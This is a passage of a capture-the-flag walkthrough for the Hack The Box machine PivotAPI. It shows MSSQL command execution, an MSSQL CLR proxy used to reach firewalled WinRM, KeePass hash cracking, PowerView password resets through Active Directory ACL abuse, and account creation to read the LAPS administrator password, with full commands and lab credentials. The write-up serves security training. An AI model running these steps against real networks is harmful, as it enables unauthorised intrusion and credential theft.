#### Enumeration

At this point I have administrator (“sa”) access on the database. I also have a valid Windows account, svc\_mssql. Looking at the Bloodhound data, this account is in the WinRM group:

![image-20210716091719264](https://0xdfimages.gitlab.io/img/image-20210716091719264.png)

I know from the emails that WinRM is firewalled off to only localhost.

#### MSSQL Shell

I was able to use Alamot’s [mssql\_shell](https://alamot.github.io/mssql_shell/) to make for easy code execution on the box:

```

oxdf@parrot$ python mssql_shell.py 
Successful login: sa@10.10.10.240
Trying to enable xp_cmdshell ...
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Windows\system32> whoami
nt service\mssql$sqlexpress

```

This doesn’t do anything fancy, just setting up `xp_cmdshell` in a nice Python interface. `rlwrap` gives it history support.

There’s a bunch of users on the box, but this user can’t access any of them:

```

CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Users> dir
 El volumen de la unidad C no tiene etiqueta.
 El número de series del volumen es: B2F2-7E0A

 Directorio de C:\Users

08/08/2020  19:46    <DIR>          .
08/08/2020  19:46    <DIR>          ..
08/08/2020  21:48    <DIR>          3v4Si0N
11/08/2020  17:32    <DIR>          administrador
08/08/2020  00:14    <DIR>          cybervaca
08/08/2020  19:46    <DIR>          Dr.Zaiuss
08/08/2020  19:21    <DIR>          jari
08/08/2020  00:14    <DIR>          Public
08/08/2020  19:22    <DIR>          superfume
08/08/2020  19:45    <DIR>          svc_mssql
               0 archivos              0 bytes
              10 dirs  14.387.363.840 bytes libres

```

Running a `netstat` does show that WinRM is listening on 5985:

```

CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Users> netstat -ano                                                                                                          
Conexiones activas

  Proto  Dirección local          Dirección remota        Estado           PID
...[snip]...
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
...[snip]...

```

I tried uploading [Chisel](https://github.com/jpillora/chisel) through this shell and making a connection back, but it doesn’t look like the firewall is allowing outbound (as the email said). I tried setting the `chisel.exe` binary on PivotAPI to listen as the server, but didn’t have any luck there as well.

#### mssqlproxy

The intended path for PivotAPI was to use [this project](https://github.com/blackarrowsec/mssqlproxy) from BlackArrow that uses MSSQL as a proxy, which is just what I need to connect to WinRM.

I’ll download the repo from GitHub as well as the two latest release dlls from [Releases](https://github.com/blackarrowsec/mssqlproxy/releases/tag/0.1) (renaming `assembly.dll` to `Microsoft.SqlServer.Proxy.dll`).

[This video](https://asciinema.org/a/298949) shows the next steps. It’s important to use the copy of `mssqlclient.py` from this repo, as it has extra functionality built in. Also, this code is written for Python2, but I didn’t have Impacket tools installed for Python2 [wrote pull request to upgrade to py3](https://github.com/blackarrowsec/mssqlproxy/pull/3) (code [here](https://github.com/0xdf-0xdf/mssqlproxy/tree/python3)).

I’ll connect with their copy of `mssqlclient.py`, and see the `enable_ole` option in the help:

```

oxdf@parrot$ python3 /opt/mssqlproxy/mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     download {remote} {local}  - download a remote file to a local path
     upload {local} {remote}    - upload a local file to a remote path (OLE required)
     enable_ole                 - you know what it means
     disable_ole                - you know what it means
     
SQL> 

```

Following the steps in the video, I’ll `enable_ole`, then upload the dll:

```

SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
[+] Uploading 'reciclador.dll' to 'C:\windows\temp\reciclador.dll'...
[+] Size is 111616 bytes
[+] Upload completed
SQL> exit

```

Now I drop out of this shell, and re-run the modified `mssqlclient.py` with the various options to install and start the proxy:

```

oxdf@parrot$ python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240' -install -clr Microsoft.SqlServer.Proxy.dll
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[*] Proxy mode: install
[*] CLR enabled
[*] Assembly successfully installed
[*] Procedure successfully installed

oxdf@parrot$ python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240' -check -reciclador 'C:\windows\temp\reciclador.dll'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[*] Proxy mode: check
[*] Assembly is installed
[*] Procedure is installed
[*] reciclador is installed
[*] clr enabled

oxdf@parrot$ python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240' -start -reciclador 'C:\windows\temp\reciclador.dll'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[*] Proxy mode: check
[*] Assembly is installed
[*] Procedure is installed
[*] reciclador is installed
[*] clr enabled
[*] Proxy mode: start
[*] Triggering Proxy Via MSSQL, waiting for ACK
[*] ACK from server!
[*] Listening on port 1337...

```

I can verify my local box is listening on 1337:

```

oxdf@parrot$ sudo netstat -tnlp | grep 1337
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      1822431/python3

```

I’ll add the following line to `/etc/proxychains.conf` (it’s important to use a Socks5 proxy):

```

socks5  127.0.0.1 1337

```

Now I can show that WinRM is open on localhost:

```

oxdf@parrot$ proxychains nmap -Pn -p 5985 127.0.0.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 17:26 EDT
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:5985  ...  OK
Nmap scan report for localhost (127.0.0.1)
Host is up (0.19s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds

```

#### Shell

I can connect with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

oxdf@parrot$ proxychains evil-winrm -i 127.0.0.1 -u svc_mssql -p '#mssql_s3rV1c3!2020'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:5985  ...  OK
*Evil-WinRM* PS C:\Users\svc_mssql\Documents>

```

## Shell as 3v4Si0N

### Enumeration

There’s no `user.txt` file on svc\_mssql’s desktop, but there is a Keepass database:

```
*Evil-WinRM* PS C:\Users\svc_mssql\desktop> ls

    Directorio: C:\Users\svc_mssql\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/8/2020  10:12 PM           2286 credentials.kdbx
*Evil-WinRM* PS C:\Users\svc_mssql\desktop> download credentials.kdbx
Info: Downloading C:\Users\svc_mssql\desktop\credentials.kdbx to credentials.kdbx

Info: Download successful!

```

### Crack Password

Keepass databases are protected by a password. I’ll use `keepass2john` to create a hash for the password:

```

oxdf@parrot$ keepass2john credentials.kdbx
credentials:$keepass$*2*60000*0*006e4f7f747a915a0301bded09da8339260ff96caf1ca7cef63b8fdd37c6a836*deabca672663938eddc0ee9e2726d9ff65d4ab7c6863f6f712f1c14b97c670a2*b33392502f94cd323ed25bc2d9c1749a*67ac769a9693b2ef7f1a149fb4e182042fcd2888df727ef4226edb5d9ae35c5c*dccf52b56e846bf088caa284beeaceffe16f304586ee13e87197387bac16ca6b
oxdf@parrot$ keepass2john credentials.kdbx > credentials.kdbx.hash

```

Now I’ll look up the Hash-Mode on the [Hashcat reference](https://hashcat.net/wiki/doku.php?id=example_hashes), and feed the hash to `hashcat` with `rockyou`:

```

oxdf@parrot$ hashcat -m 13400 credentials.kdbx.hash /usr/share/wordlists/rockyou.txt --user
hashcat (v6.1.1) starting...
...[snip]...
$keepass$*2*60000*0*006e4f7f747a915a0301bded09da8339260ff96caf1ca7cef63b8fdd37c6a836*deabca672663938eddc0ee9e2726d9ff65d4ab7c6863f6f712f1c14b97c670a2*b33392502f94cd323ed25bc2d9c1749a*67ac769a9693b2ef7f1a149fb4e182042fcd2888df727ef4226edb5d9ae35c5c*dccf52b56e846bf088caa284beeaceffe16f304586ee13e87197387bac16ca6b:mahalkita
...[snip]...

```

It breaks pretty quickly, mahalkita.

### Enumerate DB

I like to use the `kpcli` to enumerate a KeePass DB (like I’ve shown previously in [Safe](/2019/10/26/htb-safe.html#explore-db), `sudo apt install kpcli`).

```

oxdf@parrot$ echo "mahalkita" | kpcli -kdb credentials.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
Database/
kpcli:/> cd Database/
kpcli:/Database> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/

```

There’s a bunch of folders, no passwords in the root. Looking at each folder, there are two in the Recycle Bin that don’t look so interesting:

```

kpcli:/Database> ls eMail/
kpcli:/Database> ls General/
kpcli:/Database> ls Homebanking/
kpcli:/Database> ls Internet/
kpcli:/Database> ls Network/
kpcli:/Database> ls Recycle\ Bin/
=== Entries ===
0. Sample Entry                                               keepass.info
1. Sample Entry #2                          keepass.info/help/kb/testform.
kpcli:/Database> show -f Recycle\ Bin/Sample\ Entry

 Path: /Database/Recycle Bin/
Title: Sample Entry
Uname: User Name
 Pass: Password
  URL: https://keepass.info/
Notes: Notes

kpcli:/Database> show -f Recycle\ Bin/Sample\ Entry\ #2 

 Path: /Database/Recycle Bin/
Title: Sample Entry #2
Uname: Michael321
 Pass: 12345
  URL: https://keepass.info/help/kb/testform.html
Notes:

```

There’s also one in Windows that does:

```

kpcli:/Database> ls Windows/
=== Entries ===
0. SSH   
kpcli:/Database> show -f Windows/SSH 

 Path: /Database/Windows/
Title: SSH
Uname: 3v4Si0N
 Pass: Gu4nCh3C4NaRi0N!23
  URL: 
Notes: 

```

### SSH

Those creds work to connect over SSH:

```

oxdf@parrot$ sshpass -p 'Gu4nCh3C4NaRi0N!23' ssh 3v4Si0N@10.10.10.240
Microsoft Windows [Versión 10.0.17763.1879]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N>

```

And I can now grab `user.txt`:

```

licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N\Desktop>type user.txt
4855ef51************************

```

## Shell as superfume

### Enumeration

#### Box

There’s nothing else in 3v4Si0N’s home directory. There is an interesting folder at the root of `c:\`, `Developers`:

```

PS C:\> ls

    Directorio: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       08/08/2020     19:23                Developers
d-----       08/08/2020     12:53                inetpub
d-----       08/08/2020     22:48                PerfLogs
d-r---       11/02/2021     11:18                Program Files
d-----       09/08/2020     17:06                Program Files (x86)
d-r---       12/02/2021      0:46                Users
d-----       12/02/2021      1:19                Windows

```

I can’t access it, or even get the list of users who can:

```

PS C:\> ls .\Developers\
ls : Acceso denegado a la ruta de acceso 'C:\Developers'. 
En línea: 1 Carácter: 1
+ ls .\Developers\
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Developers\:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
PS C:\> icacls .\Developers\
.\Developers\: Acceso denegado.
Se procesaron correctamente 0 archivos; error al procesar 1 archivos

```

There is, however, a Developers group in the domain:

```

PS C:\> net group /domain

Cuentas de grupo de \\PIVOTAPI
-------------------------------------------------------------------------------
*Administradores clave
*Administradores clave de la organización
*Administradores de empresas
*Administradores de esquema
*Admins. del dominio
*Controladores de dominio
*Controladores de dominio clonables
*Controladores de dominio de sólo lectura
*Developers
*DnsUpdateProxy
*Enterprise Domain Controllers de sólo lectura
*Equipos del dominio
*Invitados del dominio
*LAPS ADM
*LAPS READ
*Propietarios del creador de directivas de grupo
*Protected Users
*Usuarios del dominio
*WinRM
Se ha completado el comando correctamente.

```

#### Bloodhound

Back in bloodhound, I’ll mark 3v4si0n as owned, and look at what they can control. Interestingly, they have control over a handful of other users:

![image-20210429173620450](https://0xdfimages.gitlab.io/img/image-20210429173620450.png)

Since I know I’m interested in the developers group, I’ll try to check for a path there by clicking the little road icon at the top left to get the target node. For the starting node, I’ll enter 3v4Si0N, and for the target I’ll enter developers:

![image-20210217181217086](https://0xdfimages.gitlab.io/img/image-20210217181217086.png)

On hitting play, there’s a clear path:

![image-20210429173507087](https://0xdfimages.gitlab.io/img/image-20210429173507087.png)

### Change Dr.Zaiuss’s Password

I’ll clone <https://github.com/PowerShellMafia/PowerSploit> and checkout the dev branch.

```

oxdf@parrot$ git clone https://github.com/PowerShellMafia/PowerSploit.git
Cloning into 'PowerSploit'...
remote: Enumerating objects: 3086, done.
remote: Total 3086 (delta 0), reused 0 (delta 0), pack-reused 3086
Receiving objects: 100% (3086/3086), 10.47 MiB | 10.62 MiB/s, done.
Resolving deltas: 100% (1809/1809), done.
oxdf@parrot$ cd PowerSploit/
oxdf@parrot$ git checkout dev 
Branch 'dev' set up to track remote branch 'dev' from 'origin'.
Switched to a new branch 'dev'

```

Now I’ll upload `PowerView.ps1` to PivotAPI over `scp`:

```

oxdf@parrot$ sshpass -p 'Gu4nCh3C4NaRi0N!23' scp /opt/PowerSploit/Recon/PowerView.ps1 3v4Si0N@10.10.10.240:'C:\programdata\pv.ps1'

```

Now I’ll load `PowerView.ps1` and change the password:

```

PS C:\> Import-Module Programdata\pv.ps1 
PS C:\> $pass = ConvertTo-SecureString 'qwe123QWE!@#' -AsPlainText -Force 
PS C:\> Set-DomainUserPassword -Identity dr.zaiuss -AccountPassword $pass 

```

3v4Si0N is a member of the SSH group:

```

PS C:\ProgramData> net user 3v4si0n
...[snip]...
Miembros del grupo local                   *SSH
Miembros del grupo global                  *Usuarios del dominio
Se ha completado el comando correctamente.

```

Dr.Zaiuss is not:

```

PS C:\ProgramData> net user dr.zaiuss
...[snip]...
Miembros del grupo local
Miembros del grupo global                  *Usuarios del dominio
                                           *WinRM
Se ha completado el comando correctamente.

```

But they are in the WinRM group. I could go back through the MSSQL proxy, but I’d rather use SSH tunneling. I’ll disconnect and reconnect as 3v4Si0N with a tunnel to 3389:

```

oxdf@parrot$ sshpass -p 'Gu4nCh3C4NaRi0N!23' ssh 3v4Si0N@10.10.10.240 -L 5985:127.0.0.1:5985
bind [127.0.0.1]:5985: Address already in use
channel_setup_fwd_listener_tcpip: cannot listen to port: 5985
Could not request local forwarding.
Microsoft Windows [Versión 10.0.17763.1879]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N>

```

The `-L 5985:127.0.0.1:5985` tells SSH to listen on my VM on port 5985, and send any traffic it receives through the SSH connection, and then out to 127.0.0.1:5985 (which will be PivotAPI).

Now I can connect as Dr.Zaiuss over Evil-WinRM:

```

oxdf@parrot$ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p 'qwe123QWE!@#'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Dr.Zaiuss\Documents> 

```

### Change superfume’s Password

I’ll use the same commands to change superfume’s password:

```
*Evil-WinRM* PS C:\programdata> Import-Module .\pv.ps1
*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString 'qwe123QWE!@#' -AsPlainText -Force 
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity superfume -AccountPassword $pass

```

superfume also can’t SSH, but can WinRM. I’ll ride through the same SSH tunnel:

```

oxdf@parrot$ evil-winrm -i 127.0.0.1 -u superfume -p 'qwe123QWE!@#'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\superfume\Documents>

```

## Shell as Jari

### Enumeration

As superfume, I can now access `c:\developers`:

```
*Evil-WinRM* PS C:\developers> ls

    Directorio: C:\developers

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         8/8/2020   7:26 PM                Jari
d-----         8/8/2020   7:23 PM                Superfume

```

There’s nothing in superfume’s directory, but Jari has some source and an exe:

```
*Evil-WinRM* PS C:\developers> ls superfume
*Evil-WinRM* PS C:\developers> ls jari

    Directorio: C:\developers\jari

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/8/2020   7:26 PM           3676 program.cs
-a----         8/8/2020   7:18 PM           7168 restart-mssql.exe

```

I’ll use the Evil-WinRM `download` to get both:

```
*Evil-WinRM* PS C:\developers\jari> download program.cs
Info: Downloading C:\developers\jari\program.cs to program.cs

Info: Download successful!
*Evil-WinRM* PS C:\developers\jari> download restart-mssql.exe
Info: Downloading C:\developers\jari\restart-mssql.exe to restart-mssql.exe

Info: Download successful!

```

### RE

#### program.cs

The source has an `RC4` class with a complete (and to my eye working) `Encrypt` and `Decrypt` functions:

```

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;

namespace restart_oracle
{
    class Program
    {
        public class RC4
        {

            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
...[snip]...
                return cipher;
            }

            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }

            public static byte[] StringToByteArray(String hex)
            {
...[snip]...
            }

        }

        static void Main()
        {
        
            string banner = @"
    ____            __             __                               __
   / __ \___  _____/ /_____ ______/ /_   ____ ___  ______________ _/ /
  / /_/ / _ \/ ___/ __/ __ `/ ___/ __/  / __ `__ \/ ___/ ___/ __ `/ / 
 / _, _/  __(__  ) /_/ /_/ / /  / /_   / / / / / (__  |__  ) /_/ / /  
/_/ |_|\___/____/\__/\__,_/_/   \__/  /_/ /_/ /_/____/____/\__, /_/   
                                                             /_/      
                                                 by @HelpDesk 2020

";
            byte[] key = Encoding.ASCII.GetBytes("");
            byte[] password_cipher = { };
            byte[] resultado = RC4.Decrypt(key, password_cipher);
            Console.WriteLine(banner);
            Thread.Sleep(5000);
            System.Diagnostics.Process psi = new System.Diagnostics.Process();
            System.Security.SecureString ssPwd = new System.Security.SecureString();
            psi.StartInfo.FileName = "c:\\windows\\syswow64\\cmd.exe";
            psi.StartInfo.Arguments = "/c sc.exe stop SERVICENAME ; sc.exe start SERVICENAME";
            psi.StartInfo.RedirectStandardOutput = true;
            psi.StartInfo.UseShellExecute = false;
            psi.StartInfo.UserName = "Jari";
            string password = "";
            for (int x = 0; x < password.Length; x++)
            {
               ssPwd.AppendChar(password[x]);
            }
            password = "";
            psi.StartInfo.Password = ssPwd;
            psi.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            psi.Start();

        }
    }
}

```

But the `main` function is clearly incomplete. It calls `RC4.Decrypt` with `key` and `password_cipher`, but both are empty, and the result isn’t used. Then it creates a process. There’s a `password` variable that’s an empty string that’s build into a `SecureString`, and that is what’s passed into the process.

#### restart-mssql.exe

This binary isn’t wrapped in all the anti-debug that the previous one was:

```

oxdf@parrot$ file restart-mssql.exe 
restart-mssql.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows

```

On a Windows VM, I’ll open it in DNSpy:

![image-20210218085229181](https://0xdfimages.gitlab.io/img/image-20210218085229181.png)

Interestingly, the assembly name in the file metadata is actually `restart-oracle.exe`, not `restart-mssql`. But it is the program that matches the source. And the encrypted password and key are filled in (though still not used once decrypted).

I’ll set a break point at the `Console.WriteLine` call just after the `Decrypt` (using F9), and hit F5 to start debugging. It breaks, and `array` is in the Locals window:

![image-20210218090139395](https://0xdfimages.gitlab.io/img/image-20210218090139395.png)

I can manually convert that hex to ASCII, but right clicking on `array` and selecting Show In Memory Window will give a hexdump:

![image-20210218090224391](https://0xdfimages.gitlab.io/img/image-20210218090224391.png)

The password is *Cos@Chung@!RPG*.

### WinRM

That password worked over SSH-tunneled Evil-WinRM:

```

oxdf@parrot$ evil-winrm -i 127.0.0.1 -u jari -p 'Cos@Chung@!RPG'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jari\Documents> 

```

## Shell as Administrador

### Enumeration

#### Bloodhound

Bloodhound shows Jari has First Degree Object Control over two other users:

![image-20210429174405632](https://0xdfimages.gitlab.io/img/image-20210429174405632.png)

That is `ForceChangePassword` permissions on Gibeon and Stoormq:

![image-20210429174428335](https://0xdfimages.gitlab.io/img/image-20210429174428335.png)

Stooormq doesn’t have anything interesting. But Gibdeon is a member of the Opers. De Cuentas (Account Operators) group, which Bloodhound puts a gem on for high value:

![image-20210426121335088](https://0xdfimages.gitlab.io/img/image-20210426121335088.png)

Members of the [Account Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators) group can:

> Create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers.
>
> Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the [Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-admins), [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators), [Account Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators), [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators), or [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators) groups. Members of this group cannot modify user rights.

#### LAPS

The [Local Administrator Password Solution](https://www.microsoft.com/en-us/download/details.aspx?id=46899), or LAPS, is a system for managing local administrator passwords on computers on an active directory domain. It generates and changes the password for the local administrators on hosts and stores it at the domain level, so that administrators don’t have to remember or reuse passwords on hosts across the enterprise.

ADSecurity has a good article on [Pentesting LAPS](https://adsecurity.org/?p=3164). The binary is on PivotAPI:

```
*Evil-WinRM* PS C:\programdata> ls 'c:\program files\LAPS\CSE\Admpwd.dll'

    Directory: C:\program files\LAPS\CSE

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/22/2016   8:02 AM         148632 Admpwd.dll

```

[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) can also pull the settings:

```

  [+] LAPS Settings
   [?] If installed, local administrator password is changed frequently and is restricted by ACL
    LAPS Enabled: 1
    LAPS Admin Account Name:
    LAPS Password Complexity: 3
    LAPS Password Length: 20
    LAPS Expiration Protection Enabled: 

```

### Reset Gibdeon Password

Same deal as before:

```
*Evil-WinRM* PS C:\programdata> Import-Module .\pv.ps1 
*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString 'qwe123QWE!@#' -AsPlainText -Force 
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity gibdeon -AccountPassword $pass

```

The challenge this time is that gibdeon isn’t in WinRM or SSH. I’ll have to work from the jari shell using a `PSCredential` object as gibdeon.

```
*Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('gibdeon', $pass)

```

### Create Account

As an account operator, gibdeon can create accounts:

```
*Evil-WinRM* PS C:\programdata> New-AdUser bob -credential $cred -enabled $true -accountpassword $pass

```

I had to fight with this one a lot. `New-DomainUser` would run, and it would throw a vague error, but then the user would be created. However, it would be disabled, and nothing I could do enable it worked, and it complained about the password being not complex enough no matter how complex I made it.

With `New-ADUser`, it worked, but I had to make sure to give `-enabled $true`, or else the account would be disabled, and I didn’t have permissions to enable it. But, the above command did work.

### Grant Groups

I want to be in the WinRM and SSH groups so I can access the box:

```
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity WinRM -Credential $cred -Members 'bob'
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity SSH -Credential $cred -Members 'bob'

```

I’d also like to be in the LAPS Read group:

```
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'LAPS READ' -Credential $cred -Members 'bob'

```

### Get LAPS Password

Now I can connect over SSH as bob:

```

PS C:\programdata>oxdf@parrot$ sshpass -p 'qwe123QWE!@#' ssh bob@10.10.10.240
Microsoft Windows [Versión 10.0.17763.1790]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

licordebellota\0xdf@PIVOTAPI C:\Users\bob>

```

Drop into PowerShell and get the LAPS password from the computer object:

```

licordebellota\bob@PIVOTAPI C:\Users\bob>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. Todos los derechos reservados.

PS C:\Users\bob> Get-ADComputer PivotAPI -property 'ms-mcs-admpwd' 

DistinguishedName : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb 
DNSHostName       : PivotAPI.LicorDeBellota.htb
Enabled           : True
ms-mcs-admpwd     : 7BzS0y089bE250p625Bb
Name              : PIVOTAPI
ObjectClass       : computer
ObjectGUID        : 98783674-e6a3-4d9e-87e3-efe5f31fabbf
SamAccountName    : PIVOTAPI$
SID               : S-1-5-21-842165252-2479896602-2762773115-1004
UserPrincipalName :

```

The `ms-mcs-admpwd` value, “7BzS0y089bE250p625Bb” is the current local administrator password for the box.

### Shell

With that password, I can WinRM (over my SSH tunnel) as the local administrator. Since the machine is using Spanish, the account is administrador:

```

oxdf@parrot$ evil-winrm -i 127.0.0.1 -p 7BzS0y089bE250p625Bb -u administrador

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\administrador\Documents>

```

There’s no flag on this user’s desktop, but there is one on the other domain admin, cybervaca:

```
*Evil-WinRM* PS C:\Users\cybervaca\desktop> type root.txt
b32c5e3e************************

```

## Beyond Root: Unintendeds

Securing Active Directory and Windows is difficult. There are a couple unintended shortcuts that I’ll show here, as well as others I’ve heard of that I haven’t had a chance to writeup.

### Shortcut #1

Before getting a foothold, but after getting creds to connect to MSSQL, I tried using the Alamot shell (which is just a fancy wrapper around `xp_cmdshell` in MSSQL) to look around. I wasn’t able to do much, and turned to using MSSQL as a proxy to get access to WinRM. With WinRM access, I was able to find the KeePass database and get creds that worked over SSH.

At this point I have creds for the svc\_mssql user, and the intended path is to use them to connect to WinRM. That also means that this user can do a PowerShell run as from the shell via MSSQL.

[CyberChef](https://gchq.github.io/CyberChef/) is really nice here. I’ll start with the following code:

```

$user='LicorDeBellota.htb\svc_mssql'; 
$pass = ConvertTo-SecureString '#mssql_s3rV1c3!2020' -AsPlainText -Force; 
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
try { 
  Invoke-Command -ScriptBlock { [Convert]::ToBase64String([IO.File]::ReadAllBytes('c:\users\svc_mssql\desktop\credentials.kdbx')) | Out-File C:\programdata\0xdf.txt } -ComputerName PivotAPI -Credential $cred 
} catch { 
  echo $_.Exception.Message
}

```

I’ll drop that into CyberChef and use the base64 and encoding recipes to create 16-bit base64 that PowerShell will run:

[![image-20210526162846353](https://0xdfimages.gitlab.io/img/image-20210526162846353.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210526162846353.png)

I can use a plan `mssqlclient` connection here, and drop into `xp_cmdshell` and run the PowerShell above:

```

oxdf@parrot$ mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240'
